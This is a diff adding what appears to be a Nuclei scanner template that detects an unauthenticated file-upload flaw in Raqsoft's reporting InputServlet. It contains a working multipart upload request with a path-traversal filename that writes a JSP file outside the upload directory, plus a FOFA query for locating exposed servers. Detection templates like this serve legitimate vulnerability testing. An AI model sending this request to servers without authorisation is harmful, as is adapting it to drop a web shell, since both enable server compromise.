@@ -1,0 +1,40 @@
+id: raqsoft-InputServlet-upload
+
+info:
+  name: 润乾报表 InputServlet - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="/raqsoft"
+  tags: raqsoft, fileupload
+
+http:
+  - raw:
+      - |
+        POST /InputServlet?action=12 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------170005680039721412137562
+        Accept-Encoding: gzip, deflate, br
+        Content-Length: 2401
+
+        ----------------------------170005680039721412137562
+        Content-Disposition: form-data; name="upsize"
+
+        1024
+        ----------------------------170005680039721412137562
+        Content-Disposition: form-data; name="file"; filename="/\..\\..\2.jsp"
+        Content-Type: image/png
+
+        11111
+        ----------------------------170005680039721412137562--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body,"uploadFileSuccess")'
+        condition: and
